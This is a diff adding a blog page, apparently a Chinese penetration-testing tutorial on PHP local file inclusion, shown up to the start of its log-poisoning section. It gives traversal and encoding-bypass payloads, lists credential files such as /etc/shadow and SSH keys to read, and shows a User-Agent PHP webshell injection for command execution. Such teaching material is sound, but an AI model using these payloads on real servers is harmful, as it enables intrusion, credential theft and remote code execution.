@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="一、概述本地文件包含（Local File Inclusion，LFI）是指攻击者利用Web应用中不安全的文件包含机制，读取服务器本地文件甚至执行任意代码。与远程文件包含（RFI）不同，LFI聚焦于目标主机本地资源。 LFI常见于PHP中使用 include()、require()、include_once()、require_once() 且未对用户输入做充分过滤的场景。危害轻则泄露敏感信息，重">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞：LFI本地文件包含">
+<meta property="og:url" content="https://congliang.github.io/LFI-local-file-inclusion/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="一、概述本地文件包含（Local File Inclusion，LFI）是指攻击者利用Web应用中不安全的文件包含机制，读取服务器本地文件甚至执行任意代码。与远程文件包含（RFI）不同，LFI聚焦于目标主机本地资源。 LFI常见于PHP中使用 include()、require()、include_once()、require_once() 且未对用户输入做充分过滤的场景。危害轻则泄露敏感信息，重">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-08-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.918Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/LFI-local-file-inclusion/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/LFI-local-file-inclusion/","path":"LFI-local-file-inclusion/","title":"文件包含漏洞：LFI本地文件包含"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>文件包含漏洞：LFI本地文件包含 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">一、概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">2.</span> <span class="nav-text">二、漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%B8%B8%E8%A7%81%E5%8F%AF%E8%AF%BB%E5%8F%96%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="nav-number">3.</span> <span class="nav-text">三、常见可读取的敏感文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-Linux"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 Linux</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-Windows"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 Windows</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="nav-number">4.</span> <span class="nav-text">四、路径穿越与绕过技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%9F%BA%E6%9C%AC%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 基本路径穿越</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-Null-Byte-%E6%88%AA%E6%96%AD%EF%BC%88-00%EF%BC%89%E2%80%94%E2%80%94-%E5%8E%86%E5%8F%B2%E6%89%8B%E6%B3%95"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 Null Byte 截断（%00）—— 历史手法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">4.3.</span> <span class="nav-text">4.3 编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD%EF%BC%88%E5%8E%86%E5%8F%B2%EF%BC%89"><span class="nav-number">4.4.</span> <span class="nav-text">4.4 路径长度截断（历史）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-Windows-%E7%89%B9%E6%AE%8A%E6%89%8B%E6%B3%95"><span class="nav-number">4.5.</span> <span class="nav-text">4.5 Windows 特殊手法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81-proc-%E4%BC%AA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">五、&#x2F;proc 伪文件系统利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-proc-self-environ"><span class="nav-number">5.1.</span> <span class="nav-text">5.1 &#x2F;proc&#x2F;self&#x2F;environ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-proc-self-fd-%E6%9E%9A%E4%B8%BE"><span class="nav-number">5.2.</span> <span class="nav-text">5.2 &#x2F;proc&#x2F;self&#x2F;fd&#x2F; 枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-proc-self-cmdline"><span class="nav-number">5.3.</span> <span class="nav-text">5.3 &#x2F;proc&#x2F;self&#x2F;cmdline</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%B1%A1%E6%9F%93%EF%BC%88Log-Poisoning%EF%BC%89"><span class="nav-number">6.</span> <span class="nav-text">六、日志文件污染（Log Poisoning）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-Apache-%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97"><span class="nav-number">6.1.</span> <span class="nav-text">6.1 Apache 访问日志</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-SSH-%E8%AE%A4%E8%AF%81%E6%97%A5%E5%BF%97%EF%BC%88auth-log%EF%BC%89"><span class="nav-number">6.2.</span> <span class="nav-text">6.2 SSH 认证日志（auth.log）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E9%82%AE%E4%BB%B6%E6%97%A5%E5%BF%97%EF%BC%88mail-log%EF%BC%89"><span class="nav-number">6.3.</span> <span class="nav-text">6.3 邮件日志（mail.log）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-4-%E6%B1%A1%E6%9F%93%E6%B5%81%E7%A8%8B"><span class="nav-number">6.4.</span> <span class="nav-text">6.4 污染流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81PHP-%E5%B0%81%E8%A3%85%E5%99%A8%EF%BC%88Wrappers%EF%BC%89"><span class="nav-number">7.</span> <span class="nav-text">七、PHP 封装器（Wrappers）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-filter-%E8%AF%BB%E6%BA%90%E7%A0%81"><span class="nav-number">7.1.</span> <span class="nav-text">php:&#x2F;&#x2F;filter 读源码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81Windows-LFI-%E7%89%B9%E6%AE%8A%E6%8A%80%E5%B7%A7"><span class="nav-number">8.</span> <span class="nav-text">八、Windows LFI 特殊技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">9.</span> <span class="nav-text">九、防御措施</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#9-1-%E7%99%BD%E5%90%8D%E5%8D%95%E6%9C%BA%E5%88%B6%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="nav-number">9.1.</span> <span class="nav-text">9.1 白名单机制（推荐）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-2-%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE%E5%8A%A0%E5%9B%BA"><span class="nav-number">9.2.</span> <span class="nav-text">9.2 输入过滤与配置加固</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%EF%BC%88Flowchart%EF%BC%89"><span class="nav-number">10.</span> <span class="nav-text">十、完整攻击流程（Flowchart）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E5%B8%B8%E8%A7%81%E8%AF%AF%E5%8C%BA%E4%B8%8E%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">11.</span> <span class="nav-text">十一、常见误区与注意事项</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">12.</span> <span class="nav-text">十二、实验环境与免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">13.</span> <span class="nav-text">免责声明</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/LFI-local-file-inclusion/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="文件包含漏洞：LFI本地文件包含 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件包含漏洞：LFI本地文件包含
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-08-15 08:00:00" itemprop="dateCreated datePublished" datetime="2025-08-15T08:00:00+08:00">2025-08-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>本地文件包含（Local File Inclusion，LFI）是指攻击者利用Web应用中不安全的文件包含机制，读取服务器本地文件甚至执行任意代码。与远程文件包含（RFI）不同，LFI聚焦于目标主机本地资源。</p>
+<p>LFI常见于PHP中使用 <code>include()</code>、<code>require()</code>、<code>include_once()</code>、<code>require_once()</code> 且未对用户输入做充分过滤的场景。危害轻则泄露敏感信息，重则导致远程代码执行（RCE）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户输入: ?page=../../../etc/passwd  →  include($_GET[&#x27;page&#x27;])  →  返回 /etc/passwd 内容</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、漏洞成因"><a href="#二、漏洞成因" class="headerlink" title="二、漏洞成因"></a>二、漏洞成因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);             <span class="comment">// 拼接后缀但未过滤</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;/var/www/pages/&quot;</span> . <span class="variable">$file</span>;   <span class="comment">// 限定目录但未拦截 ../</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>开发者常误认为后缀硬编码（<code>.php</code>）或目录限定足以防御，但多种绕过手段使这些假设失效。核心原则：永远不要信任用户输入。</p>
+<h2 id="三、常见可读取的敏感文件"><a href="#三、常见可读取的敏感文件" class="headerlink" title="三、常见可读取的敏感文件"></a>三、常见可读取的敏感文件</h2><h3 id="3-1-Linux"><a href="#3-1-Linux" class="headerlink" title="3.1 Linux"></a>3.1 Linux</h3><table>
+<thead>
+<tr>
+<th>文件路径</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/etc/passwd</code></td>
+<td>用户列表</td>
+</tr>
+<tr>
+<td><code>/etc/shadow</code></td>
+<td>密码哈希（需root）</td>
+</tr>
+<tr>
+<td><code>/etc/hosts</code> <code>/etc/hostname</code></td>
+<td>主机信息</td>
+</tr>
+<tr>
+<td><code>/etc/crontab</code></td>
+<td>定时任务</td>
+</tr>
+<tr>
+<td><code>/etc/apache2/apache2.conf</code> <code>/etc/nginx/nginx.conf</code></td>
+<td>Web服务器配置</td>
+</tr>
+<tr>
+<td><code>/etc/mysql/my.cnf</code></td>
+<td>MySQL配置（可能含密码）</td>
+</tr>
+<tr>
+<td><code>/proc/self/environ</code></td>
+<td>环境变量（含User-Agent等请求头）</td>
+</tr>
+<tr>
+<td><code>/proc/self/cmdline</code></td>
+<td>进程启动命令</td>
+</tr>
+<tr>
+<td><code>/proc/self/fd/0</code> ~ <code>/proc/self/fd/50</code></td>
+<td>文件描述符枚举</td>
+</tr>
+<tr>
+<td><code>/proc/version</code> <code>/proc/cpuinfo</code></td>
+<td>系统指纹</td>
+</tr>
+<tr>
+<td><code>/var/log/apache2/access.log</code></td>
+<td>Apache访问日志</td>
+</tr>
+<tr>
+<td><code>/var/log/auth.log</code></td>
+<td>SSH认证日志</td>
+</tr>
+<tr>
+<td><code>/var/log/mail.log</code> <code>/var/log/syslog</code></td>
+<td>邮件&#x2F;系统日志</td>
+</tr>
+<tr>
+<td><code>/home/&lt;user&gt;/.ssh/id_rsa</code></td>
+<td>SSH私钥</td>
+</tr>
+<tr>
+<td><code>/home/&lt;user&gt;/.bash_history</code></td>
+<td>命令历史</td>
+</tr>
+</tbody></table>
+<h3 id="3-2-Windows"><a href="#3-2-Windows" class="headerlink" title="3.2 Windows"></a>3.2 Windows</h3><table>
+<thead>
+<tr>
+<th>文件路径</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>C:\Windows\win.ini</code></td>
+<td>系统配置</td>
+</tr>
+<tr>
+<td><code>C:\boot.ini</code></td>
+<td>引导配置</td>
+</tr>
+<tr>
+<td><code>C:\Windows\System32\drivers\etc\hosts</code></td>
+<td>主机名映射</td>
+</tr>
+<tr>
+<td><code>C:\Windows\System32\config\SAM</code></td>
+<td>密码哈希（锁定态不可读）</td>
+</tr>
+<tr>
+<td><code>C:\Windows\repair\SAM</code> <code>repair\system</code></td>
+<td>SAM&#x2F;注册表备份</td>
+</tr>
+<tr>
+<td><code>C:\xampp\php\php.ini</code></td>
+<td>PHP配置</td>
+</tr>
+<tr>
+<td><code>C:\inetpub\wwwroot\web.config</code></td>
+<td>IIS配置</td>
+</tr>
+</tbody></table>
+<h2 id="四、路径穿越与绕过技术"><a href="#四、路径穿越与绕过技术" class="headerlink" title="四、路径穿越与绕过技术"></a>四、路径穿越与绕过技术</h2><h3 id="4-1-基本路径穿越"><a href="#4-1-基本路径穿越" class="headerlink" title="4.1 基本路径穿越"></a>4.1 基本路径穿越</h3><p>通过 <code>../</code> 向上跳转目录，突破应用限定的文件范围：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page=../../../../etc/passwd</span><br><span class="line">/var/www/html/pages/../../../../etc/passwd → /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-Null-Byte-截断（-00）——-历史手法"><a href="#4-2-Null-Byte-截断（-00）——-历史手法" class="headerlink" title="4.2 Null Byte 截断（%00）—— 历史手法"></a>4.2 Null Byte 截断（%00）—— 历史手法</h3><p>PHP &lt; 5.3.4 中，null byte 可截断字符串使硬编码后缀失效：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">应用代码: include($file . &#x27;.php&#x27;);</span><br><span class="line">攻击载荷: ?page=../../../etc/passwd%00</span><br><span class="line">实际执行: include(&quot;../../../etc/passwd\0.php&quot;) → 读取 /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>现代 PHP 已修复，但遗留系统、嵌入式设备（路由器&#x2F;摄像头&#x2F;IoT）中仍存在。</p>
+<h3 id="4-3-编码绕过"><a href="#4-3-编码绕过" class="headerlink" title="4.3 编码绕过"></a>4.3 编码绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">../ → %2e%2e%2f          （全量URL编码）</span><br><span class="line">../ → %2e%2e/ ..%2f      （部分编码）</span><br><span class="line">../ → %252e%252e%252f    （双重URL编码，绕过单次解码过滤）</span><br><span class="line">../ → ..%252f            （混合双重编码）</span><br><span class="line">../ → ..%c0%af           （Unicode overlong UTF-8斜杠）</span><br><span class="line">../ → ..%ef%bc%8f        （全角斜杠）</span><br><span class="line">../ → ..\                （反斜杠，Windows兼容）</span><br></pre></td></tr></table></figure>
+
+<p>针对递归过滤（<code>str_replace(&#39;../&#39;, &#39;&#39;, ...)</code>）的交错绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">....// → 过滤中间../ → 剩下 ../</span><br><span class="line">..././ → 过滤后 ../../</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-4-路径长度截断（历史）"><a href="#4-4-路径长度截断（历史）" class="headerlink" title="4.4 路径长度截断（历史）"></a>4.4 路径长度截断（历史）</h3><p>PHP &lt; 5.2.8 中路径超过 4096 字节时超出部分被截断（部分文件系统上限不同），可绕过 <code>.php</code> 后缀拼接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=../../../etc/passwd/./././. ... (填充至 4096+ 字节)</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-5-Windows-特殊手法"><a href="#4-5-Windows-特殊手法" class="headerlink" title="4.5 Windows 特殊手法"></a>4.5 Windows 特殊手法</h3><p>Windows 文件系统自动去除路径末尾的点号和空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page=../../../boot.ini.       （末尾多余点号自动去除）</span><br><span class="line">?page=../../../boot.ini%20     （末尾空格自动去除）</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、-proc-伪文件系统利用"><a href="#五、-proc-伪文件系统利用" class="headerlink" title="五、&#x2F;proc 伪文件系统利用"></a>五、&#x2F;proc 伪文件系统利用</h2><h3 id="5-1-proc-self-environ"><a href="#5-1-proc-self-environ" class="headerlink" title="5.1 &#x2F;proc&#x2F;self&#x2F;environ"></a>5.1 &#x2F;proc&#x2F;self&#x2F;environ</h3><p>User-Agent 等 HTTP 请求头会出现在环境变量中。攻击者通过请求头注入 PHP 代码：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?page=../../../proc/self/environ</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>随后 <code>?page=/proc/self/environ&amp;cmd=id</code> 即可执行命令。注意部分发行版已设 <code>/proc/self/environ</code> 为仅 root 可读（<code>0400</code>），但容器和旧系统中常可读。</p>
+<h3 id="5-2-proc-self-fd-枚举"><a href="#5-2-proc-self-fd-枚举" class="headerlink" title="5.2 &#x2F;proc&#x2F;self&#x2F;fd&#x2F; 枚举"></a>5.2 &#x2F;proc&#x2F;self&#x2F;fd&#x2F; 枚举</h3><p>进程文件描述符可能指向已被 include 的文件或上传的临时文件。枚举 fd&#x2F;0 ~ fd&#x2F;50：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=/proc/self/fd/0   ?page=/proc/self/fd/12</span><br></pre></td></tr></table></figure>
+
+<p>此法在”文件上传+包含”场景尤为有效：PHP上传临时文件即便被删除，只要进程 fd 未关闭仍可读取。</p>
+<h3 id="5-3-proc-self-cmdline"><a href="#5-3-proc-self-cmdline" class="headerlink" title="5.3 &#x2F;proc&#x2F;self&#x2F;cmdline"></a>5.3 &#x2F;proc&#x2F;self&#x2F;cmdline</h3><p>读取进程启动命令和参数，用于信息收集：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=/proc/self/cmdline    →  获取应用根路径、配置路径</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、日志文件污染（Log-Poisoning）"><a href="#六、日志文件污染（Log-Poisoning）" class="headerlink" title="六、日志文件污染（Log Poisoning）"></a>六、日志文件污染（Log Poisoning）</h2><p>将 PHP 代码写入日志文件，再通过 LFI 包含执行，是 LFI 升级为 RCE 的核心技术。</p>
